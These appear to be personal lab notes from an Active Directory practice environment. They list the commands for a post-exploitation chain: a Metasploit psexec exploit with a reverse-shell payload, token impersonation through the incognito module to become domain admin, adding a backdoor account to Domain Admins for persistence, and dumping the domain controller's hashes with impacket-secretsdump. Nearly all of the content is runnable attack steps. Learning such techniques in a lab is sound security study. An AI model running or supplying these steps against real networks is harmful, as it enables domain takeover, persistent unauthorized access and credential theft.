- Note: There are other tools that can do token impersonation as well, if metasploit doesn't work, we can use those.
# Using metasploit's incognito module
---
- `use exploit/windows/smb/psexec`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set rhosts 10.0.1.9` => Punisher machine
- `set smbuser fcastle`
- `set smbpass Password1`
- `set smbdomain MARVEL.local`
- `run`
- ![[Pasted image 20250330035119.png]]
- `load incognito` module
- `list_tokens -u`
- ![[Pasted image 20250330035321.png]]
- `impersonate_token marvel\\fcastle`
- `shell`
- ![[Pasted image 20250330035426.png]]  
- `rev2self` => get back previous account
- ![[Pasted image 20250330035515.png]]

# Gaining access to MARVEL\kamran:
---
- Login as `MARVEL\kamran : Password1234` on `ThePunisher` machine to generate the `delegate` token.
- ![[Pasted image 20250330053922.png]]
- Became ==MARVEL\kamran== **domain admin**
- ![[Pasted image 20250330054015.png]]

- Let's add another domain user `hawkeye` for **persistent access**:
	- `net user /add hawkeye Password1@ /domain`
	- `net group "Domain Admins" hawkeye /ADD /DOMAIN`
	- ![[Pasted image 20250330054315.png]]
	- **==Now we can dump hashes directory from domain controller as we are domain admin==**:
		- `impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@10.0.1.4`